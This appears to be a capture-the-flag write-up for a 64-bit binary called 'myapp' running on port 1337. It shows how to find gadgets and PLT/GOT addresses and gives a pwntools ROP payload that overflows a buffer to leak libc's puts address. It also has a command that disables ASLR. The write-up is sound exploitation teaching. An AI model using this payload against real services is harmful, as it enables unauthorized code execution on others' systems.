![](./logo.png)

# USER

Looking at the page source we can seen the message

```html
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
```

The binary is a `64-bit` application. Therefore, consideration needs to be made for the exploit.

Instead of passing arguments on the stack like a `32-bit` application, `64-bit` applications use registers in the 
order listed below: 
```
+---------+------+------+------+------+------+------+
| syscall | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
+---------+------+------+------+------+------+------+
|   %rax  | %rdi | %rsi | %rdx | %r10 | %r8  | %r9  |
+---------+------+------+------+------+------+------+
```

### First attempt - `puts` leak
The idea to exploit this application is to leak the address of the `libc` version of `puts` so we can form an offset to the position of the `libc` import.


Running:
```
$ objdump -D myapp | grep puts

0000000000401030 <puts@plt>:
  401030:       ff 25 e2 2f 00 00       jmpq   *0x2fe2(%rip)        # 404018 <puts@GLIBC_2.2.5>
  4011a1:       e8 8a fe ff ff          callq  401030 <puts@plt>
```

Providing us with:
```
puts@plt: 0x4011a1
puts@got: 0x404018
```

We then also need a `pop rdi; ret` command. This can be detected with `ROPgadget`. This will put the argument on the stack. In this case we want to print the position of the `puts@got` to find the addresses that change each execution.

Running:
```
$ ROPgadget --binary myapp | grep "pop rdi"

0x000000000040120b : pop rdi ; ret
```
Giving us the address of the gadget.

Putting this together will leak the addresses we need. 

A minimal working example could be like so:
```python
from pwn import *

BUFFER_LEN = 112 + 8 # 112 + BASE POINTER
BUFFER = b"A" * BUFFER_LEN

# # ROUND 1
g1      = p64(0x40120b) # pop rdi ; ret
got_put = p64(0x404018)
plt_put = p64(0x401030)
main    = p64(0x40115f)

payload = BUFFER
payload += g1
payload += got_put
payload += plt_put
payload += main

# [...]

# libc puts location
leaked_puts = io.recvline().strip().ljust(8, b'\x00')
```

The line: 
```python
main    = p64(0x40115f)
```

Is required to stop the program from crashing, as it sets up the program for a second loop.


# Commands

### Deactivate stack randomization

```
sysctl kernel.randomize_va_space=0
```

### Viewing writeable memory 

```
readelf --sections <BINARY>
```
```
readelf -x .data myapp
```